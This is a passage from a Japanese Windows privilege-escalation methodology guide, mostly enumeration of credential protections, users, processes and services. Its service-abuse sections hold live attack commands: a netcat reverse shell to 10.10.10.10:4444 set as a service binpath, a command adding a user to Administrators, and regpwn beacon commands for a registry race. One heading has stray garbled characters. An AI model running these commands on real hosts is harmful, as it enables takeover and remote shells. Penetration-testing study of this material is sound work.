reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**し、各パスワードが**一意でランダムであり、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** から、Microsoft は Local Security Authority (LSA) の強化された保護機能を導入し、信頼されていないプロセスによるメモリの**読み取り**やコードの挿入を**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威からデバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに興味深い権限がないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、権限昇格のためにそれらを悪用する方法については、こちらをご覧ください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**とは何かを**詳しく解説**しています: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページでは、**興味深いtoken**と、それらを悪用する方法について解説しています:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオンユーザー / セッションқәа

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスの一覧を表示し、**プロセスのコマンドラインにパスワードが含まれていないか確認してください**。\
実行中のバイナリを**上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html) を実行できる可能性があるか調べてください。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。権限昇格に悪用できる可能性があります。

debugger listener は短時間しか起動しない場合があるため、受動的なポートスナップショットで確認できなかったからといって、公開されたことがないとは限りません。確認できた listener については、PID、プロセスの所有者、権限の低いユーザーがアクセスできるかを照合してください。アプリケーション名や debug フラグだけでは、ユーザーをまたいだコード実行が可能だとは判断できません。通常の列挙は受動的に行い、debugger コマンドは送信しないでください。

**プロセスのバイナリのアクセス許可を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリがあるフォルダのアクセス権を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイル内で宣言された `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクまたはサービスについては、その設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分のトークンでそのディレクトリにファイルを作成できる場合、そのタスクまたはサービスが次にモジュールを読み込む際の code execution の候補パスとして調査できます。実行アカウントの実効権限、アクティブな設定、モジュールの互換性、拒否または共有に関する制限を確認してください。ディレクトリが書き込み可能というだけでは、権限昇格が成立するとは限りません。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) では、実行時のモジュール読み込みについて説明しています。

### 書き込み可能な document root を持つ特権 Web サービス

Windows Apache のインストールでは、サービスの実行ファイルパスと実行アカウントを、アクティブな `httpd.conf` 内の `DocumentRoot` と照合してください。標準的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されたドキュメントルートの ACL（多くの場合 `C:\xampp\htdocs`）を確認します。Apache が `LocalSystem` として実行されている間に、低権限ユーザーがそのルートにファイルを作成できる場合、server-side code execution によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、該当する正確なパスが配信対象であること、そして server-side handler がそのファイル形式を処理することを確認してください。ルートが書き込み可能というだけで確認できるのは、ファイル作成が可能ということだけです。ファイルへの書き込みを行わずに ACL を確認してください:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

従来型の WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit の構成では `C:\wamp\...`）を指し、その隣の `conf\httpd.conf` に設定があり、既定のルートは `C:\wamp64\www` または `C:\wamp\www` である場合があります。サービスの正確なイメージ、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開と virtual-host の上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込めるというだけでは、Apache が `SYSTEM` として実行されていることや、配置したファイルが実行されることの証明にはなりません。[Apache は、Windows サービスがどのように設定を選択するかを説明しています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、`applicationHost.config` で書き込み可能な物理ディレクトリを**稼働中の site/application**に対応付けてから、設定されている pool とサーバー側 handler を特定します。配信ディレクトリに置いたコードが pool として実行されるのは、IIS がそのファイル形式を処理し、かつそのルートにアクセスできる場合に限られます。書き込み可能なディレクトリをコード実行とみなす前に、現在のユーザーの実効的なファイル作成権限、site の実行状態、handler、パスごとの上書き設定を確認してください。

ASP.NET の動的コンパイルについても別途確認が必要です。生成されたファイルは、アプリケーションのコンパイルディレクトリに置かれます。既定では、該当する .NET Framework のインストール先の下にある `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は保存場所とアプリケーションごとのサブディレクトリについて説明しており](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)、[application pool 同士が互いを信頼しない場合は、コンパイルディレクトリを分離することを推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低権限の token が**特定の**アプリケーションの cache 内の生成ソースを変更できる場合、そのアプリケーションがより高い権限を持つ[worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかどうかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明にはなりません。cache と稼働中のアプリケーション、実効 token と ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを誘発したり cache ファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` に設定された IIS pool は、ローカルの token が低権限であっても、一般にドメインリソースへの認証に**ホストコンピューターアカウント**を使用します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` の pool は、設定されたアカウントを使用します。[Microsoft はこれらの ID タイプ](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。identity 設定が省略されている場合、pool の既定値が継承されることがあります。既定値は IIS の世代によって異なるため、pool 名から推測せず、実効設定を確認してください。コード実行がコンピューターアカウントのネットワーク ID を持つ pool に到達する場合、その**特定のコンピューター**の directory 権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメイン命名コンテキストに対するレプリケーション権限が必要です。machine-account ticket やホストの役割だけでは、その権限の証明にはなりません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、ticket の要求を行わずに、設定と ACL を確認してください。

helper process を起動する読み取り可能な ASP.NET handler については、リクエスト由来の値が認証、復号、検証、コマンド構築を経る流れを追跡してください。デコードした token を `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell のメタ文字によってコマンドを変更される可能性があります。[Microsoft は `cmd` の特殊文字を説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼されていない呼び出し元が実際にデコード後の値に影響を与えられ、handler に到達できることを確認してから、実効 application-pool または impersonation の ID と、子プロセスの ID を特定してください。読み取り可能なソースコードの一行、localhost listener、token 形式の脆弱性だけでは、特権コマンド実行の証明にはなりません。受動的な列挙では、偽造リクエストを送信したり helper を実行したりせずに、ソースコードと pool の設定を確認してください。

Windows 上の PHP service では、リクエスト制御可能なパスを [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡すと、worker の ID で低権限ユーザーが書き込み可能な PHP ファイルが評価される可能性があります。リクエストがその文に到達できること、解決されたパスが低権限ユーザーには変更可能で worker には読み取り可能なファイルを指すこと、適用される PHP のパス制限で include が許可されること、worker が実際により高い権限で実行されていることを確認してください。loopback listener や書き込み可能なファイルだけでは、この一連の成立を証明できません。受動的な列挙では、endpoint を呼び出さずにソースコード、service の ID、ファイル ACL を確認してください。

### メモリ上のパスワードマイニング

sysinternals の **procdump** を使って、実行中のプロセスのメモリダンプを作成できます。FTP などの service は**メモリ内に資格情報を平文で保持**しているため、メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「コマンド プロンプト」を検索し、「クリックしてコマンド プロンプトを開く」をクリックする

### 特権アカウントによるプロジェクトファイルのインポート

低権限ユーザーが書き込み可能な drop directory からプロジェクトを自動で開くアプリケーションは、インポーターのアカウントで入力の信頼境界を越えます。**実際に書き込み可能なパス**、それを開くプロセスまたはタスク、その実効 ID、パーサーのビルドを確認してください。[過去の Ghidra プロジェクトのオープン／復元に関する問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトのメタデータで XML external entity が許可されていました。Windows 上では、[アウトバウンド SMB と NTLM のポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可している場合、ネットワーク上の entity によってインポートアカウントから認証が行われる可能性があります。これは認証情報漏えいにつながる手掛かりであり、ただちに管理者アクセスが得られることを意味しません。応答を利用するには、別途、許可された、または脆弱な経路が必要です。また、現行ビルドは実際のパッチ適用状況に基づいて評価してください。受動的な列挙中に細工したプロジェクトを開かず、インポートのワークフローと ACL を調べてください。

## Services

Service Control Manager (SCM) オブジェクトの [`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定した読み取り専用の [`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、新しいサービスを実行できる証明にはならず、調査の手掛かりにすぎません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。このハンドルには作成時に要求されたサービスアクセス権が付与されます。後からサービスを再オープンする場合は別途アクセスチェックが行われるため、元のハンドルを使用できても再オープンには失敗することがあります。実効ローカルまたはリモートトークン、付与されたハンドル権限、サービスアカウント、起動ポリシー、実行ファイルのパスを個別に確認してください。受動的な列挙中にサービスを作成または起動しないでください。

リモートからサービスをインストールする経路については、SCM 権限と、対象上にある、**同じネットワークログオン**で書き込み可能な共有、その共有の基盤となる NTFS ACL、サービスアカウントが実行可能なローカル実行ファイルのパスを照合してください。SCM 権限が異常に広く、ファイルを配置する経路も存在する場合、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須ではありません。共有への書き込み権限だけでも、SCM のサービス作成権限だけでも、新しいサービスがより高い ID で起動できるとは限りません。

既存のサービスは、`ImagePath` にヘルパー実行ファイルが指定されていなくても、起動、シャットダウン、または別のライフサイクルイベント時にヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い ID で実行される場合、欠落しているヘルパーファイルは条件付きの置換候補になります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることやファイルが欠落していることだけでは、サービスがそのファイルを読み込む証明になりません。受動的な調査ではサービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START` により `StartService` に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。起動権限を単なる制御権以上のものとみなす前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使う場合は、サービス ID、引数が書き込みに使われるまでの正確な処理、パスの制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる特権コンシューマーまたはローダーが別途存在する場合だけです。書き込み可能なログや起動権限だけでは不十分です。受動的なインベントリ調査では、サービスを起動したりテストファイルを作成したりしないでください。

NSClient++ monitoring agent では、読み取り可能な `nsclient.ini` は**設定を調査する手掛かり**です。このファイルには Web 認証情報が含まれる場合があり、`boot.ini` によって別の場所にある設定ファイルが指定されることもあります。実際のサービスアカウント、WEB listener とアクセスポリシー、認証済みのロールに設定やスクリプトを変更する権限があるかを確認してください。特権で実行するには、さらに `CheckExternalScripts`（または別の有効な実行経路）、コマンドを登録または変更する実効権限、サービス ID で実行されるトリガーが必要です。loopback のみを受け付ける listener でもローカルユーザーからアクセスできる場合がありますが、ファイルパス、パスワード、listener のいずれも、それだけではこれらの権限を証明しません。受動的な列挙中は、秘密情報を表示したり Web API を呼び出したりせずに、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` のサービスでは、サービスの実際の実行アカウントと `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を調べてください。[NSSM は子アプリケーションをこの値に保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory` は設定された作業ディレクトリです。wrapper の権限だけでサービスの境界全体を判断せず、子実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP endpoint は、別途調査する手掛かりです。低権限ユーザーが listener に到達できること、該当する操作がそのユーザーの入力を受け取ること、サービスの子プロセスが安全でない操作をより高い ID で実行することを確認してください。サービスアカウント、endpoint URL、書き込み可能なパスだけでは権限昇格の証明になりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御する文字列が PowerShell runspace に渡される処理を追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加し](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)、[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows transport credentials を使用する `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、**その特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービス ID で実行される `AddScript` までの経路は、コード実行の境界です。listener ポート、認証済みクライアント、無関係なアセンブリにある未使用メソッドだけでは証明になりません。列挙中に endpoint を呼び出さず、デプロイ済みのサービス、contract、認可、impersonation の設定を静的に調査してください。

Service Triggers により、特定の条件（named pipe／RPC endpoint のアクティビティ、ETW event、IP の利用可能状態、デバイスの到着、GPO の更新など）に応じて Windows がサービスを起動することがあります。SERVICE_START 権限がなくても、トリガーを発生させて特権サービスを起動できる場合があります。列挙と起動の手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling を含む Visual Studio のインストール環境には、`LocalSystem` として実行するように設定された diagnostic service、`VSStandardCollectorService150` が含まれることがあります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junction と object-manager-link の race を利用し、サービスの DACL reset 先をリダイレクトしました。実証された権限昇格には、利用可能な Visual Studio Setup WMI Provider MSI の repair 経路と、その対象である `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` も必要でした。このコンポーネントは 2024 年 1 月に修正されました。

受動的なトリアージでは、このサービスのアカウントとバイナリパスを調べ、Setup WMI compiler のパスが存在するかを確認し、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studio の製品バージョン、コンパイラファイルだけでは、ホストが脆弱であるとは判断できません。調査のためにサービスを起動したり、repair を実行したりする必要はありません。

サービスの一覧を取得します:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

**sc** を使用してサービスに関する情報を取得できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるかどうかを確認することを推奨します:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生する場合（たとえば SSDPSRV の場合）:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次のコマンドで有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**（XP SP1では、サービス upnphost が動作するには SSDPSRV に依存することに注意してください）**

**この問題の別の回避策**は、次を実行することです：

```
sc.exe config usosvc start= auto
```

### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対して **SERVICE_ALL_ACCESS** を持つ場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、次のようなさまざまなアクセス許可を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再構成できます。
- **WRITE_DAC**: アクセス許可を再構成できるため、サービス構成を変更できます。
- **WRITE_OWNER**: 所有権を取得し、アクセス許可を再構成できます。
- **GENERIC_WRITE**: サービス構成を変更する権限を継承します。
- **GENERIC_ALL**: サービス構成を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されていて、**低権限ユーザーがサービスの EXE またはその親フォルダーを変更できる**場合、**バイナリを置き換えてサービスを再起動する**ことで、サービスを乗っ取れることがよくあります。

**サービスが実行するバイナリを変更できるか**、またはバイナリが配置されている**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**）。**\
**wmic**（system32 内にはありません）を使って、サービスが実行するすべてのバイナリを取得し、**icacls** でアクセス許可を確認できます:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリに書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

便利な自動チェック：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスで通常のユーザーによる再起動が許可されていない場合は、起動時に自動で開始されるか、障害発生時に再起動するアクションが設定されているか、またはそのサービスを利用するアプリケーションから間接的に起動できるかを確認してください。

### サービスのレジストリ変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次の方法で**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

元の権限テストでは、次のように記載されていました。

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** に `FullControl` 権限があるか確認します。権限がある場合、サービスによって実行されるバイナリを変更できます。

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認してください。ACL エントリがあるだけでは、実効アクセスが可能であるとは限りません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` 権限や `SERVICE_START` 権限とは別です。権限昇格にはさらに、利用可能なサービス構成フィールド、サービスを起動する手段、およびより高い権限を持つサービス ID が必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには：

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race による任意の HKLM value write (ATConfig)

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後に **SYSTEM** プロセスによって HKLM のセッションキーにコピーされます。Registry **symbolic link race** を利用して、この特権付きの書き込みを **任意の HKLM path** にリダイレクトすると、任意の HKLM **value write** を行えるようになります。<sup>[[18]](#references)</sup>

主な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン時やセキュアデスクトップへの切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. **LockWorkstation** などを実行して、セキュアデスクトップへのコピーをトリガーします。これにより AT broker の処理が始まります。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発火したら、**HKLM Session ATConfig** キーを、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、リダイレクトされた HKLM path に攻撃者が指定した値を書き込みます。

任意の HKLM value write ができたら、service configuration values を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常のユーザーが起動できるサービス（例: **`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装は、race の一環として workstation をロックします。

ツールの例 (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

レジストリにこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windows サービスの場合、**任意のコードを実行するにはこれで十分です。**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows は空白までの各部分を実行しようとします。

たとえば、パス _C:\Program Files\Some Folder\Service.exe_ に対して、Windows は次を実行しようとします。

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込み Windows サービスに属するものを除き、Unquoted Service Paths をすべて列挙してください:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
